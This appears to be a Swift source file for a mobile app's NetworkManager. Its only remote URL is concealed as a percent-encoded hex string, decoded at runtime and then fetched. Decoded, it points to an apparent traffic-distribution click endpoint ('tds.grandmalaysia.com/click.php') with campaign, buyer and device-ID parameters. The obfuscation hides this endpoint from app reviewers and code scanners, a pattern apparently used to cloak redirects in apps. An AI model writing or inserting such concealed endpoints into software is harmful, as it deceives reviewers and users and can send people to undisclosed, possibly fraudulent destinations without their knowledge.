
import Foundation

protocol NetworkDelegate {
    var origin: URL? { get }
    func fetchData() async throws -> HTTPURLResponse
}

struct NetworkManager: NetworkDelegate {
    
    static let shared = NetworkManager()
    
    private var stringSource: String {
        "%68%74%74%70%73%3A%2F%2F%74%64%73%2E%67%72%61%6E%64%6D%61%6C%61%79%73%69%61%2E%63%6F%6D%2F%63%6C%69%63%6B%2E%70%68%70%3F%6B%65%79%3D%6C%78%79%6A%33%6C%6E%7A%6F%31%32%37%36%71%36%6A%32%6F%62%36%26%74%31%3D%7B%63%72%65%6F%7D%26%63%61%6D%70%61%69%67%6E%49%64%3D%7B%63%61%6D%70%61%69%67%6E%49%64%7D%26%61%64%47%72%6F%75%70%49%64%3D%7B%61%64%47%72%6F%75%70%49%64%7D%26%63%6F%75%6E%74%72%79%4F%72%52%65%67%69%6F%6E%3D%7B%63%6F%75%6E%74%72%79%4F%72%52%65%67%69%6F%6E%7D%26%74%35%3D%7B%62%75%79%65%72%7D%26%74%36%3D%7B%73%65%63%6F%6E%64%5F%63%6C%69%63%6B%7D%26%6B%65%79%77%6F%72%64%49%64%3D%7B%6B%65%79%77%6F%72%64%49%64%7D%26%61%74%74%72%69%62%75%74%69%6F%6E%3D%7B%61%74%74%72%69%62%75%74%69%6F%6E%7D%26%74%39%3D%7B%61%6E%64%72%6F%69%64%5F%69%64%7D%26%61%70%70%5F%64%6F%6D%61%69%6E%3D%7B%61%70%70%5F%64%6F%6D%61%69%6E%7D"
    }
    
    var origin: URL? {
        URL(string: convertFromASCII())
    }
    
    func fetchData() async throws -> HTTPURLResponse {
        if let source = origin {
            do {
                let (_, response) = try await URLSession.shared.data(from: source)
                
                if let response = response as? HTTPURLResponse {
                    return response
                } else {
                    throw URLError(.badServerResponse)
                }
            } catch {
                throw error
            }
        } else {
            throw URLError(.badURL)
        }
    }
}

extension NetworkManager {
    private func convertFromASCII() -> String {
        var cString: String = ""
        
        var startIndex = stringSource.startIndex
        
        while startIndex < stringSource.endIndex {
            if stringSource[startIndex] == "%" {
                let nextIndex = stringSource.index(startIndex, offsetBy: 3)
                let hexCode = String(stringSource[stringSource.index(startIndex, offsetBy: 1)..<nextIndex])
                
                if let scalarValue = UInt32(hexCode, radix: 16),
                   let scalar = UnicodeScalar(scalarValue) {
                    cString.append(Character(scalar))
                }
                
                startIndex = nextIndex
            } else {
                cString.append(stringSource[startIndex])
                startIndex = stringSource.index(startIndex, offsetBy: 1)
            }
        }
        
        return cString
    }
}
